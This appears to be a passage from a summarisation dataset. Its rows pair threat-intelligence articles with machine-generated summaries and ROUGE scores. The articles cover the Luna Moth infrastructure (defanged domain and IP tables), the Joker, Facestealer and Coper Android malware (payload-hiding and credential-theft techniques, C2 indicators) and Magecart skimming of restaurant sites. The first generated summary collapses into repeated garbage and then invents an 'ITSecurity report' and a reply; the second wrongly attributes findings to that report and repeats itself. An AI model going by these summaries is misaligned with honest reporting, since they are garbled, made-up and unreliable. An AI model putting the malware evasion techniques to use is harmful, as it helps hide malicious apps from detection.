devices, these include Atera, Splashtop, Syncro, and AnyDesk. These tools also provide the threat actors with some redundancy and persistence: if one of the RATs is removed from the system, it can be reinstalled by the others.Additional tools used by the group include off-the-shelf tools such as SoftPerfect Network Scanner, SharpShares, andRclone. The tools are stored on compromised machines under false names masquerading as legitimate binaries. These tools, in addition to the RATs, provide the threat actors with the means to conduct basic reconnaissance activities, access additional available assets, and exfiltrate data from compromised networks.campaign infrastructureThe infrastructure used by 'Luna Moth' as part of the subscription scams can be mapped to two main clusters of domains and IPs:Exfiltration domains: Domains under the XYZ TLD, such as maaays[.]xyz. These domains are used by the group as part of the Rclone exfiltration process, the domains are the target to which the exfiltrated data is sent.Phishing domains that appear to be related to Zoho or Duolingo - for example, masterzohoclass[.]com. Most of these domains have a very short lifespan of about four hours.The first identified domain related to the campaign was registered during April 2022. Both the exfiltration and phishing domains are hosted by the provider Hostwinds, and registered under Namecheap.Domain IP Address Registration Date Type dictumst[.]xyz 23[.]254[.]229[.]90 18/04/2022 08:46 Exfiltration Server tincidunt[.]xyz 192[.]119[.]110[.]47 18/04/2022 08:53 Exfiltration Server deserunt[.]xyz 192[.]119[.]110[.]22 18/04/2022 08:54 Exfiltration Server mczoho[.]com 192[.]119[.]111[.]25 18/04/2022 14:27 Infrastructure masterzohoclass[.]com 192[.]236[.]178[.]3 19/04/2022 13:54 Infrastructure zohocook[.]com 192[.]236[.]177[.]251 20/04/2022 10:42 Infrastructure molestie[.]xyz 192[.]236[.]193[.]152 21/04/2022 07:21 Exfiltration Server adipiscing[.]xyz 192[.]236[.]193[.]150 21/04/2022 07:21 Exfiltration Server fringilla[.]xyz 192[.]236[.]193[.]148 21/04/2022 13:18 Exfiltration Server volutpat[.]xyz 192[.]236[.]193[.]151 21/04/2022 13:19 Exfiltration Server ultrices[.]xyz 192[.]236[.]193[.]149 21/04/2022 13:19 Exfiltration Server cookwithzoho[.]com 192[.]236[.]193[.]141 21/04/2022 13:34 Infrastructure cookingbyzoho[.]com 192[.]236[.]193[.]140 22/04/2022 12:15 Infrastructure massay[.]xyz 192[.]236[.]177[.]20 25/04/2022 11:28 Exfiltration Server masaay[.]xyz 192[.]236[.]176[.]79 25/04/2022 11:28 Exfiltration Server myaaas[.]xyz 192[.]236[.]192[.]84 25/04/2022 11:29 Exfiltration Server myaasa[.]xyz 192[.]236[.]179[.]76 25/04/2022 11:29 Exfiltration Server myasaa[.]xyz 192[.]236[.]178[.]135 25/04/2022 11:29 Exfiltration Server masyaa[.]xyz 192[.]236[.]193[.]86 25/04/2022 11:30 Exfiltration Server maysaa[.]xyz 192[.]236[.]193[.]81 25/04/2022 11:30 Exfiltration Server msaaay[.]xyz 192[.]236[.]192[.]215 25/04/2022 11:30 Exfiltration Server maaays[.]xyz 192[.]236[.]194[.]2 25/04/2022 11:35 Exfiltration Server maaasy[.]xyz 192[.]236[.]194[.]31 25/04/2022 11:36 Exfiltration Server cookingzoho[.]com 192[.]236[.]195[.]42 25/04/2022 12:50 Infrastructure zohomclass[.]com 192[.]236[.]195[.]83 26/04/2022 13:02 Infrastructure zohocooking[.]com 192[.]236[.]198[.]22 27/04/2022 12:12 Infrastructure studyzoho[.]com 192[.]236[.]198[.]23 28/04/2022 11:02 Infrastructure molesste[.]xyz 192[.]236[.]208[.]56 28/04/2022 20:53 Exfiltration Server zohocookingmeals[.]com 192[.]236[.]199[.]2 29/04/2022 10:49 Infrastructure zohokitchen[.]com 192[.]236[.]192[.]2 02/05/2022 13:12 Infrastructure ullamm[.]xyz 23[.]254[.]227[.]79 02/05/2022 16:36 Exfiltration Server zohokitchenmaster[.]com 192[.]236[.]192[.]9 03/05/2022 10:54 Infrastructure zohoteachingmaster[.]com 192[.]236[.]192[.]69 04/05/2022 12:42 Infrastructure zohoteaching[.]com 192[.]236[.]192[.]73 05/05/2022 14:02 Infrastructure tincidut[.]xyz 142[.]11[.]215[.]104 06/05/2022 13:48 Exfiltration Server masterclassgold[.]com 142[.]11[.]215[.]25 09/05/2022 14:42 Infrastructure proodee[.]xyz 192[.]236[.]179[.]217 09/05/2022 16:07 Exfiltration Server zohocookingclass[.]com 198[.]54[.]117[.]244 10/05/2022 07:53 Infrastructure zohoclasspro[.]com 142[.]11[.]215[.]212 10/05/2022 11:42 Infrastructure deerunt[.]xyz 142[.]11[.]206[.]153 14/05/2022 08:40 Exfiltration Server nostuud[.]xyz 192[.]236[.]147[.]234 14/05/2022 14:27 Exfiltration Server aliuuip[.]xyz 23[.]254[.]228[.]211 14/05/2022 14:28 Exfiltration Server zohoduolingo[.]com 192[.]236[.]209[.]36 16/05/2022 13:11 Infrastructure duolingoclass[.]com 192[.]236[.]209[.]34 17/05/2022 13:24 Infrastructure acsyruse[.]xyz 192[.]236[.]155[.]81 17/05/2022 20:56 Exfiltration Server zoholanguageclass[.]com 142[.]11[.]209[.]198 18/05/2022 12:40 Infrastructure zoholanguage[.]com 104[.]168[.]164[.]244 19/05/2022 13:40 Infrastructure duo-lingo-class[.]com 104[.]168[.]204[.]231 23/05/2022 12:27 Infrastructure caaom[.]xyz 192[.]236[.]155[.]151 23/05/2022 14:04 Exfiltration Server caaof[.]xyz 192[.]236[.]155[.]106 23/05/2022 14:05 Exfiltration Server caaog[.]xyz 192[.]236[.]155[.]138 23/05/2022 14:05 Exfiltration Server caaor[.]xyz 192[.]236[.]155[.]103 23/05/2022 14:06 Exfiltration Server caaon[.]xyz 192[.]236[.]155[.]102 23/05/2022 14:28 Exfiltration Server duolingo-class[.]com 192[.]236[.]192[.]33 24/05/2022 12:29 Infrastructure studyduolingo[.]com 192[.]236[.]177[.]18 25/05/2022 12:32 Infrastructure masterclass-cook[.]com 192[.]236[.]193[.]171 31/05/2022 13:43 Infrastructure duuis[.]xyz 192[.]236[.]249[.]78 01/06/2022 09:43 Exfiltration Server eeeaa[.]xyz 192[.]236[.]249[.]80 01/06/2022 09:43 Exfiltration Server veelit[.]xyz 192[.]236[.]249[.]79 01/06/2022 09:44 Exfiltration Server eesse[.]xyz 192[.]236[.]249[.]76 01/06/2022 09:44 Exfiltration Server moolit[.]xyz 192[.]236[.]249[.]75 01/06/2022 09:45 Exfiltration Server premiumduolingo[.]com 104[.]168[.]201[.]129 01/06/2022 12:49 Infrastructure cook-masterclass[.]com 104[.]168[.]201[.]121 01/06/2022 12:50 Infrastructure yourduolingo[.]com 104[.]168[.]201[.]87 02/06/2022 11:55 Infrastructure masterclasscooking[.]com 192[.]119[.]111[.]51 03/06/2022 12:20 Infrastructure duolingoeducation[.]com 192[.]119[.]111[.]21 03/06/2022 12:20 Infrastructure educationduolingo[.]com 192[.]119[.]111[.]197 06/06/2022 11:32 Infrastructure masterclass-chef[.]com 104[.]168[.]201[.]100 06/06/2022 11:33 Infrastructure allduolingo[.]com 192[.]236[.]194[.]113 07/06/2022 13:02 Infrastructure allredoo[.]xyz 192[.]236[.]194[.]42 07/06/2022 16:02 Exfiltration Server aredo[.]xyz 192[.]236[.]160[.]132 07/06/2022 16:03 Exfiltration Server aeedo[.]xyz 192[.]236[.]193[.]182 07/06/2022 16:03 Exfiltration Server allreedo[.]xyz 104[.]168[.]218[.]242 07/06/2022 16:04 Exfiltration Server alloout[.]xyz 104[.]168[.]135[.]71 07/06/2022 17:16 Exfiltration Server subscriptionduolingo[.]com 192[.]236[.]195[.]74 08/06/2022 12:33 Infrastructure germanbyduolingo[.]com 192[.]236[.]208[.]44 10/06/2022 11:59 Infrastructure duolingo-italianclass[.]com 104[.]168[.]171[.]231 21/06/2022 12:43 Infrastructure aeecc[.]xyz 23[.]238[.]40[.]29 22/06/2022 19:25 Exfiltration Server eceee[.]xyz 23[.]238[.]40[.]28 22/06/2022 19:25 Exfiltration Server aeocc[.]xyz 23[.]238[.]40[.]31 22/06/2022 19:26 Exfiltration Server aedcc[.]xyz 23[.]238[.]40[.]30 22/06/2022 19:26 Exfiltration Server aeucc[.]xyz 23[.]238[.]40[.]32 22/06/2022 19:27 Exfiltration Server duolingoitalian[.]com 192[.]236[.]155[.]243 23/06/2022 13:05 Infrastructure duolingoit[.]com 192[.]236[.]176[.]197 24/06/2022 12:48 Infrastructure duolingoitclass[.]com 104[.]168[.]171[.]104 27/06/2022 13:09 Infrastructure duolingo-it[.]com 192[.]236[.]176[.]199 28/06/2022 13:07 Infrastructure italian-duolingo[.]com 192[.]119[.]110[.]112 29/06/2022 13:27 Infrastructure masterclass-design[.]com 192[.]119[.]110[.]166 29/06/2022 15:26 Infrastructure masterclass-design[.]com 192[.]119[.]110[.]166 29/06/2022 15:26 Infrastructure masterclass-design[.]com 192[.]119[.]110[.]166 29/06/2022 15:26 Infrastructure masterclass-design[.]com 192[.]119[.]110[.]166 29/06/2022 15:26 Infrastructure masterclass-design[.]com 192[.]119[.]110[.]166 29/06/2022 15:26 Infrastructure masterclass-design[.]com 192[.]119[.]110[.]166 29/06/2022 15:26 Infrastructure aaeece[.]xyz 142[.]11[.]210[.]14 15/08/2022 10:27 Exfiltration Server aaeeci[.]xyz 108[.]174[.]195[.]199 15/08/2022 10:27 Exfiltration Server aaeeco[.]xyz 108[.]174[.]197[.]196 15/08/2022 10:29 Exfiltration Server aaeecu[.]xyz 104[.]168[.]145[.]45 15/08/2022 10:27 Exfiltration Server aaeecy[.]xyz 142[.]11[.]194[.]201 15/08/2022 10:27 Exfiltration Server eebna[.]xyz 192[.]236[.]194[.]76 08/09/2022 9:52 Exfiltration Server eecna[.]xyz 192[.]236[.]194[.]77 08/09/2022 9:52 Exfiltration Server eedna[.]xyz 192[.]236[.]194[.]78 08/09/2022 9:52 Exfiltration Server eegna[.]xyz 192[.]236[.]194[.]80 08/09/2022 9:53 Exfiltration Server eetna[.]xyz 192[.]236[.]194[.]81 08/09/2022 9:53 Exfiltration Server brightmasterclass[.]com 192[.]236[.]192[.]193 06/09/2022 12:29 Infrastructure effectivemasterclass[.]com 192[.]236[.]176[.]143 24/08/2022 06:32 Infrastructure happymasterclass[.]com 192[.]119[.]110[.]131 07/09/2022 13:25 Infrastructure masterclass-business[.]com 192[.]119[.]110[.]166 16/08/2022 09:13 Infrastructure masterclasscources[.]com 23[.]254[.]225[.]145 01/09/2022 13:22 Infrastructure masterclassworld[.]com 192[.]236[.]198[.]164 09/09/2022 13:51 Infrastructure rainbowmasterclass[.]com 192[.]236[.]192[.]192 02/09/2022 13:47 Infrastructure strongmasterclass[.]com 23[.]254[.]227[.]9 25/08/2022 12:52 Infrastructure unitedmasterclass[.]com 192[.]236[.]179[.]2 31/08/2022 14:02 Infrastructure westsidemasterclass[.]com 23[.]254[.]228[.]85 08/09/2022 13:18 Infrastructure westernmasterclass[.]com 23[.]254[.]225[.]145 01/09/2022 16:52 InfrastructureIf you were impacted by this attack or are seeking guidance on how to prevent similar attacks, please contact us at contact@sygnia.co or our 24-hour hotline +1-877-686-8680.Contributors: Oren Biderman, Tomer Lahiyani, Noam Lifshitz, Ori Porag.";[year, the company, the company. , the report, the report, the report, the report, the report. , the IT, the report, the report. of 20202. , the report, the report, there, the IT, there, there. . , the reportage. The ITRI, 1012, of the following of the last of the last of the last offt offtays of the ITRI of IT. ays of theftays of theftays. . . . . . . . . . . . . : atter. atter. as 10 as the 10000000000000000 years, [ [ [ [ [ ays, 2 andhing of theft offt offt, 10, 12, 15, the ays, the [ays,ign, 20999999 of 12 of 15 of the of the of the of the [ of the [ of the [ays: [ays ays: ays ays of the 200000000 years of the of the of the 109 in the in of of of the that in the in the . in the . in the . as the 2. in the 20. in the 10 The ITSecurity report has been generated. The ITSecurity report states that the company's infrastructure is vulnerable to exfiltration attacks. The report also states that the company's infrastructure is vulnerable to malicious attacks. Furthermore, the report states that the company's infrastructure is vulnerable to unauthorized access. Thank you for bringing this issue to our attention. We are currently investigating the matter and will provide an update as soon as possible. In the meantime, please contact us at contact@sygnia.co or our 24hour hotline +18776868680.;en;{'r': 0.044740024183796856, 'p': 0.3627450980392157, 'f': 0.07965554164045514};{'r': 0.008742434431741762, 'p': 0.07926829268292683, 'f': 0.01574802970673228};{'r': 0.03990326481257558, 'p': 0.3235294117647059, 'f': 0.07104413152204826}
https://www.zscaler.com/blogs/security-research/joker-facestealer-and-coper-banking-malwares-google-play-store;On Google Play, Joker, Facestealer, & Coper Banking Malware;"Google Play Store is typically considered to be one of the safest sources for users to find and install android apps. However, threat actors continue to evolve their tactics and are able to successfully upload dangerous apps laced with malware on the Google play store.Recently, the Zscaler ThreatLabz team discovered apps involving multiple instances of the Joker, Facestealer, and Coper malware families spreading in the virtual marketplace. The ThreatLabz team immediately notified the Google Android Security team of these newly identified threats, and they promptly removed the malicious apps from the Google Play Store.The following is the technical analysis of these three malware family payloads that were recently discovered in the Play Store:Joker MalwareJoker is one of the most prominent malware families targeting Android devices. Despite public awareness of this particular malware, it keeps finding its way into Google's official app store by regularly modifying the malware's trace signatures including updates to the code, execution methods, and payload-retrieving techniques. This malware is designed to steal SMS messages, contact lists, and device information, and to sign the victim up for premium wireless application protocol (WAP) services. Over the past two months, our ThreatLabz researchers discovered the following malicious Joker downloader apps in the Google Play Store:Simple Note Scanner - com.wuwan.pdfscan Universal PDF Scanner - com.unpdf.scan.read.docscanuniver Private Messenger - com.recollect.linkus Premium SMS - com.premium.put.trustsms Smart Messages - com.toukyoursms.timemessages Text Emoji SMS - messenger.itext.emoji.mesenger Blood Pressure Checker - com.bloodpressurechecker.tangjiang Funny Keyboard - com.soundly.galaxykeyboard Memory Silent Camera - com.silentmenory.timcamera Custom Themed Keyboard - com.custom.keyboardthemes.galaxiy Light Messages - com.lilysmspro.lighting Themes Photo Keyboard - com.themes.bgphotokeyboard Send SMS - exazth.message.send.text.sms Themes Chat Messenger - com.relish.messengers Instant Messenger - com.sbdlsms.crazymessager.mmsrec Cool Keyboard - com.colate.gthemekeyboard Fonts Emoji Keyboard - com.zemoji.fontskeyboard Mini PDF Scanner - com.mnscan.minipdf Smart SMS Messages - com.sms.mms.message.ffei.free Creative Emoji Keyboard - com.whiteemojis.creativekeyboard.ledsloard Fancy SMS - con.sms.fancy Fonts Emoji Keyboard - com.symbol.fonts.emojikeyboards Personal Message - com.crown.personalmessage Funny Emoji Message - com.funie.messagremo Magic Photo Editor - com.amagiczy.photo.editor Professional Messages - com.adore.attached.message All Photo Translator - myphotocom.allfasttranslate.transationtranslator Chat SMS - com.maskteslary.messages Smile Emoji - com.balapp.smilewall.emoji Wow Translator - com.imgtop.camtranslator All Language Translate - com.exclusivez.alltranslate Cool Messages - com.learningz.app.cool.messages Blood Pressure Diary - bloodhold.nypressure.mainheart.ratemy.mo.depulse.app.tracker.diary Chat Text SMS - com.echatsms.messageos Hi Text SMS - ismos.mmsyes.message.texthitext.bobpsms Emoji Theme Keyboard - com.gobacktheme.lovelyemojikeyboard iMessager - start.me.messager Text SMS - com.ptx.textsms Camera Translator - com.haixgoback.outsidetext.languagecameratransla Come Messages - com.itextsms.messagecoming Painting Photo Editor - com.painting.pointeditor.photo Rich Theme Message - com.getmanytimes.richsmsthememessenge Quick Talk Message - mesages.qtsms.messenger Advanced SMS - com.fromamsms.atadvancedmmsopp Professional Messenger - com.akl.smspro.messenger Classic Game Messenger - com.classcolor.formessenger.sic Style Message - com.istyle.messagesty Private Game Messages - com.message.game.india Timestamp Camera - allready.taken.photobeauty.camera.timestamp Social Message - com.colorsocial.messageThreatLabz has discovered over 50 unique Joker downloader apps on the Play Store till now. All of these apps were downloaded over 300k times combined and they typically fall into one of the following common categories:CommunicationHealthPersonalizationPhotographyToolsThe following is the breakdown of the number of apps per category:The tools and communication were among the most targeted categories covering the majority of the Joker-infected apps. ThreatLabz discovered daily uploads of apps containing the Joker malware indicating the high activity level and persistence of the adversary group. Consistent with previous findings, ThreatLabz latest discoveries belonging to the Joker malware campaign continue to follow similar developer naming patterns and use of familiar techniques. Check out our previous blog Joker Joking in Google Play for a more in-depth analysis of this specific campaign.The following is the technical analysis of the Enjoy Message Joker app:App Name: Enjoy MessagePackage Name: sms.ienjoy.joysms.messageThe Joker malware authors develop and release a range of apps from the very complex to incredibly simple. Instead of waiting for apps to gain a specified volume of installs and reviews before swapping for a malware-laced version, the Joker developers have taken to hiding the malicious payload in a common asset file and package application using commercial packers. Serving as one of the primary reasons why these malicious apps often go undetected by antivirus softwares and during evaluation by the Play Store.Most commonly, threat actors disguise the Joker malware in messaging applications that require users to grant escalated access permissions by allowing them to serve as the default SMS app on the user's phone. The malware uses these advanced permissions to carry out its operations.In the Enjoy SMS application, the payload is hidden in the known path but the path itself is obfuscated in the application's class.Fig 1: Obfuscated path of the payloadUpon deobfuscation, the path becomes visible in the asset directory ""io/michaelrocks/libphonenumber/android/data/PhoneNumberAlternateFormatsProto_53"" where payload is residing.The package name of the application is used to derive the hash which is used as the AES decryption key. This key is used to decrypt the payload with an executable(.so) file which should contain the following declared functions.Fig 2: Function/class names of similar known SDKsTo deter investigation, the class and method names of the functions appear similar to known SDKs.""onInstall"" function in the hidden dropped executable is called at runtime after loading executable by the ""system.loadlibrary"" function.Fig 3: Implementation of malicious code inside executableAs shown above, the executable loads the method 'Wnjre' from the 'com.Brling' class. The dropped executable hides the payload with Base64 encryption.Fig 4: Base64 encrypted contentThe second payload downloads a known weaponized Java ARchive (JAR) file as a third payload as shown below.Fig 5: Decrypted payloadThe following are some examples of common techniques used by Joker Malware:1. The app confirms if its package is still live on the Google Play Store.Fig 6: Checks Google Play Store to confirm the app is still live.2. Many Joker apps hide the payload in the assets folder of the Android Package Kit (APK) and creates an ARM ABI executable to avoid detection by most sandboxes which are based on x86 architecture.3. Joker malware hides payloads with different types of encryption including, XOR, AES, DES, ElGamal which are also commonly used with fake known asset files. Few of them have extensions like JSON, TTF, PNG or database files. In several examples, apps encrypted and hide the malicious payload in the meta-data of the app manifest file. More often, the decryption key is derived from the package name of the app possibly to avoid the additional effort of customizing decryption routines.Fig 7: ELGAMAL encryptionFig 8: DES key derivation from the package nameIOCs:http://givehotdog[.]comhttps://trustcats[.]comhttp://giveme8[.]com/https://xjuys[.]oss-accelerate[.]aliyuncs[.]com/xjuyshttp://139[.]177[.]180[.]78/hellhttps://xjuys[.]oss-accelerate[.]aliyuncs[.]com/fbhx1https://xjuys.oss-accelerate[.]aliyuncs[.]com/fbhx2FaceStealer MalwareFacestealer malware was also discovered on the Google Play Store, known for targeting Facebook users with fake Facebook login screens. Once the device is infected, the user is prompted to login to Facebook and can't use the app without entering their credentials. Upon successful login, the credentials as well as auth tokens are stolen by the malware author.App Name: cam.vanilla.snappDownloads: 5000Category: ToolsFig 9: Fake Facebook login screenThe fake page shown above, opened by the app injects downloaded javascript from the server using WebView.Fig 10: URL for downloading malicious JavaScriptOnce enabled, the malware app reaches out to the command and control (C2) server to download the malicious javascript. The URL, https://busynow[.]store/config, is still active and in the latest update, the malware authors added a character to fail the automatic decode of the Base64 encoded string. In the following screenshots, the added extra ""W"" character will cause the decode failure and revert to plaintext.Fig 11: Base64 decodedAs shown in the screenshotbelow, stolen credentials and tokens are sent to the C2 serverwith the help of javascript loaded with malicious code.Fig 12: Shows the ""c_url"" parameter for a remote C2 stealing facebook credentials.IOCs:busynow[.]storeZs8668[.]comkcoffni[.]xyzCoper MalwareCoper is a well known trojan that targets banking applications in Europe, Australia, and South America disguised as a legitimate app in the Google Play Store. Once downloaded, this app unleashes the Coper malware infection which is capable of intercepting and sending SMS text messages, making USSD (Unstructured Supplementary Service Data) requests to send messages, keylogging, locking/unlocking the device screen, performing overly attacks, preventing uninstalls and generally allowing attackers to take control and execute commands on infected device via remote connection with a C2 server. The result of these activities ultimately leads to attackers gaining information and access they can leverage to steal money from victims.App Name: Unicc QR ScannerPackage name: com.qrdscannerratedxSha256: 02499a198a8be5e203b7929287115cc84d286fc6afdb1bc84f902e433a7961e4Fig 13: Unicc QR Scanner app laced with Coper malware on Google Play StoreThis app disguises itself as a free QR scanner. Once installed, the app immediately prompts the user to update the app.Fig 14: Screenshots show the process of enabling the malware infection by asking the user to upgrade the app, then prompting them to further grant advanced access permissions to the app in their device settings.Next, the threat actors use a trojan dropper designed to install malware or a backdoor to a device, by leveraging the Google Firebase app developer tool to call-out and receive the URL that will deliver the malicious payload as shown in the screenshot below.Fig 15: Firebase call-outThe malware downloads a configuration that includes the URL hosting the new and malicious payload. As shown in the screenshot below, the name of the new payload is set by the android Shared Preferences file. The name of the installed payload also continues to change as well.Fig 16: Shared preferencesThe newly installed file is a fake Google Play Store app on the device with the package name ""com.fromtoo2"" that immediately prompts the user to grant escalated accessibility permission and gain full control of the user's phone.In the background, the fake Google Play Store app loads the libWeEq.so executable file and calls the predefined MvsEujZ function as further shown and described below.Fig 17: MvsEujZ function called from executable fileThe MvsEujZ function shown above decrypts a runnable file with a static key found in the executable and prompts the user to grant escalated accessibility permissions at launch. After decrypting with libWeEq.so, the Coper code base becomes visible, as shown in the below screenshot.Fig 18: Coper codebaseThis final payload uses Rivest Cipher 4 (RC4) encryption to hide its malicious signatures and avoid detection. The following screenshot shows the decrypted C2 server addresses used by the Coper malware.Fig 19: Screenshot shows the decoded contents of the payloadIn the case that the Virtual Network Computing (VNC) service for remote-control access is not available, the malware authors leverage the android TeamViewer app to monitor the screen of the infected device as shown in the screenshot below.Fig 20: Screenshot shows the code enabling attackers to use TeamViewer to monitor the screen of a device remotelyFinally, this last screenshot shows the backend of WebView where malicious javascript is loadedto enable the attackers to take full control through a C2 server connection and execute the actions they need to compromise and ultimately extort the victim.Fig 21: Shows attackers leveraging the android developer app WebViewIOCs:raw[.]githubusercontent[.]com/k6062019/qq/main/porc[.]apkabashkinokabashkinok[.]top/ZmEwY2ZmZWYzN2Mw/asqwnbvb[.]shop/ZmEwY2ZmZWYzN2Mw/barabashkinok[.]top/ZmEwY2ZmZWYzN2Mw/ccnfddbvb[.]pics/ZmEwY2ZmZWYzN2Mw/eendfbvb[.]sbs/ZmEwY2ZmZWYzN2Mw/nbervbwe[.]monster/ZmEwY2ZmZWYzN2Mw/nbrtvbsd[.]mom/ZmEwY2ZmZWYzN2Mw/nbvb3954[.]fun/ZmEwY2ZmZWYzN2Mw/nbvbvber[.]makeup/ZmEwY2ZmZWYzN2Mw/nbvmnbbn[.]lol/ZmEwY2ZmZWYzN2Mw/nbvvvb[.]hair/ZmEwY2ZmZWYzN2Mw/nterospbnvdos[.]site/ZmEwY2ZmZWYzN2Mw/nterospusios[.]shop/ZmEwY2ZmZWYzN2Mw/ntospusios[.]top/ZmEwY2ZmZWYzN2Mw/nytbvb[.]one/ZmEwY2ZmZWYzN2Mw/qqnnffbvb[.]space/ZmEwY2ZmZWYzN2Mw/qwnnnbvb[.]skin/ZmEwY2ZmZWYzN2Mw/vbfdnbvb[.]online/ZmEwY2ZmZWYzN2Mw/vntososupplsos[.]live/ZmEwY2ZmZWYzN2Mw/wwereffnbvb[.]store/ZmEwY2ZmZWYzN2Mw/xxfdnbvb[.]quest/ZmEwY2ZmZWYzN2Mw/What Android user's can do to avoid infection by these malwares:Don't install unnecessary, untrusted, and un-vetted apps on your mobile device. Stick to the sources and providers you know and trust. Look for apps with very high install numbers and positive reviews. Seek out apps that are recommended by sources you trust and also feature lots of installs and positive reviews.Don't grant notifications listener permissions and escalated accessibility permissions to apps you don't fully trust. The notification listener service enables the package name of the app to be added to the enabled_notification_listeners provider. This enables read notifications and it includes critical access notifications like auto-generated one-time password/pin (OTP).Avoid installing messaging apps if possible or use extreme caution and take the time to research and ensure that the app is well known and reviewed. Even when a link comes from a trusted friend asking you to download a messaging app, consider the possibility that your friend's device may be compromised by malware and stop to confirm with them first, and then still take the time to conduct your own research and verify the app has a well-established and safe reputation before installing. Messaging apps require Read_SMS permission as their functionality and can easily leverage that permission to gain information including a key OTP they can use to further compromise victims.If you become a victim of a malicious app from the Play Store, inform Google about it immediately through the support options in your play Store app. It is important that we work together to identify, flag, and remove malicious apps from our preferred app stores as soon as possible to limit the spread of malware and inhibit the success of threat actors.If you are responsible for protecting your corporate network, deploy Zscaler's zero trust architecture to protect your users and prevent further compromise if a malicious app is downloaded by a user on their personal device.";"The ThreatLabz team immediately notified the Google Android Security team of these newly identified threats, and they promptly removed the malicious apps from the Google Play Store. The ITSecurity report states that the malware uses these advanced permissions to carry out its operations. In the Enjoy SMS application, the payload is hidden in the known path but the path itself is obfuscated in the application's class. Upon deobfuscation, the path becomes visible in the asset directory ""io/michaelrocks/libphonenumber/android/data/PhoneNumberAlternateFormatsProto_53"" where payload is residing. The package name of the application is used to derive the hash which is used as the AES decryption key. This key is used to decrypt the payload with an executable (.so) file which should contain the following declared functions. The malware app hides the payload with Base64 encryption. As shown above, the executable loads the method 'Wnjre' from the 'com.Brling' class. The dropped executable hides the payload with different types of encryption including, XOR, AES, DES, ElGamal which are also commonly used with fake known asset files. Few of them have extensions like JSON, TTF, PNG or database files. In several examples, apps encrypted and hide the malicious payload in the metadata of the app manifest file. More often, the decryption key is derived from the package name of the app possibly to avoid the additional effort of customizing decryption routines. As shown above, the malware app hides the payload with different types of encryption including, XOR, AES, DES, ElGamal which are also commonly used with fake known asset files. Few of them have extensions like JSON, TTF, PNG or database files. In several examples,";en;{'r': 0.13069908814589665, 'p': 0.9626865671641791, 'f': 0.23015164820727638};{'r': 0.09856153436334576, 'p': 0.925, 'f': 0.1781415485725426};{'r': 0.13069908814589665, 'p': 0.9626865671641791, 'f': 0.23015164820727638}
https://www.recordedfuture.com/amid-rising-magecart-attacks-online-ordering-platforms;Amid Rising Magecart Attacks on Online Ordering Platforms, Recent Campaigns Infect 311 Restaurants;Editor's Note: The following post is an excerpt of a full report. To read the entire analysis, click here to download the report as a PDF.Threat actors infect e-commerce websites with Magecart e-skimmers to steal online shoppers' payment card data, billing information, and personally identifiable information (PII). To counter this threat, Recorded Future's Magecart Overwatch program monitors hundreds of thousands of e-commerce websites to identify the presence of e-skimmer infections. This report details 2 recent Magecart campaigns that targeted 3 restaurant online ordering platforms, leading to the exposure of online transactions at 311 restaurants. The intended audience is financial institutions' fraud and cyber threat intelligence (CTI) teams and e-commerce security professionals.Executive SummaryOnline ordering platforms for restaurants enable customers to make online food orders and allow restaurants to outsource the burden of developing an ordering system. While top-end online ordering platforms like Uber Eats and DoorDash dominate the market, there are also hundreds of smaller online ordering platforms that serve small, local restaurants -- and even small-scale platforms may have hundreds of restaurants as clients. As a result, online ordering platforms have become a high-value target for threat actors conducting Magecart e-skimmer attacks because compromising a single online ordering platform typically results in the exposure of online transactions performed at a significant portion of the restaurants that use the platform.Recently, we identified 2 separate ongoing Magecart campaigns that have injected e-skimmer scripts into the online ordering portals of restaurants using 3 separate platforms: MenuDrive, Harbortouch, and InTouchPOS. Across all 3 platforms, at least 311 restaurants have been infected with Magecart e-skimmers, a number that is likely to grow with additional analysis.The Magecart e-skimmer infections on these restaurants' websites often result in the exposure of customers' payment card data and PII (their billing information and contact information). To date, we have already identified over 50,000 compromised payment card records that were exposed from these infected restaurants and posted for sale on the dark web.Key FindingsThe online ordering platforms MenuDrive and Harbortouch were targeted by the same Magecart campaign, resulting in e-skimmer infections on 80 restaurants using MenuDrive and 74 using Harbortouch. This campaign likely began no later than January 18, 2022, and as of this report, a portion of the restaurants remained infected, however, the malicious domain used for the campaign (authorizen[.]net) has been blocked since May 26, 2022.The online platform InTouchPOS was targeted by a separate, unrelated Magecart campaign, resulting in e-skimmer infections on 157 restaurants using the platform. This campaign began no later than November 12, 2021, and as of this report, a portion of the restaurants remain infected and the malicious domains (bouncepilot[.]net and pinimg[.]org) remain active.We have identified more than 50,000 payment card records that were skimmed from these 311 restaurants and posted for sale on the dark web. Additional compromised records from these restaurants have likely been, and will continue to be, posted for sale on the dark web.The tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) associated with the campaign targeting InTouchPOS match those of another campaign targeting e-commerce websites that do not use a centralized online ordering platform. This related campaign has infected over 400 e-commerce websites since May 2020, with over 30 of the websites still infected as of June 21, 2022.BackgroundCybercriminals often seek the highest payout for the least amount of work. This has led them to target restaurants' online ordering platforms, when even a single platform is attacked, dozens or even hundreds of restaurants can have their transactions compromised, which allows cybercriminals to steal vast amounts of customer payment card data disproportionate to the number of systems they actually hack. The COVID-19 pandemic has only exacerbated this due to an influx of online ordering as restaurants' dine-in options were restricted.In May 2021, we reported on breaches at 5 restaurant online ordering platforms, including Grabull, EasyOrdering, and eDiningExpress. The latter 2 platforms (as well as MenuDrive, Harbortouch, and InTouchPOS) all operate in a similar way: they offer a restaurant-specific ordering application hosted on platform-operated domains. As a result, if threat actors gain unauthorized access to a given online ordering platform's shared libraries, they can modify server-side scripts to affect numerous merchants through a single compromise, as these merchants often rely on the same shared libraries.This most recent attack was not Harbortouch's first breach. In 2015, Harbortouch admitted to a data breach exposing an unspecified number of restaurants, cybersecurity blog Krebs on Security reported that at least 4,200 stores running Harbortouch software were compromised.Editor's Note: The following post is an excerpt of a full report. To read the entire analysis, click here to download the report as a PDF.;Recorded Future's Magecart Overwatch program monitors hundreds of thousands of ecommerce websites to identify the presence of eskimmer infections. This report details 2 recent Magecart campaigns that targeted 3 restaurant online ordering platforms, leading to the exposure of online transactions at 311 restaurants. This campaign began no later than November 12, 2021, and as of this report, a portion of the restaurants remain infected and the malicious domains (bouncepilot[. ]net and pinimg[. ]org) remain active. We have identified more than 50,000 payment card records that were skimmed from these 311 restaurants and posted for sale on the dark web. Additional compromised records from these restaurants have likely been, and will continue to be, posted for sale on the dark web. The tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) associated with the campaign targeting InTouchPOS match those of another campaign targeting ecommerce websites that do not use a centralized online ordering platform. This related campaign has infected over 400 ecommerce websites since May 2020, with over 30 of the websites still infected as of June 21, 2022.;en;{'r': 0.3202247191011236, 'p': 0.9827586206896551, 'f': 0.4830508437503591};{'r': 0.24608150470219436, 'p': 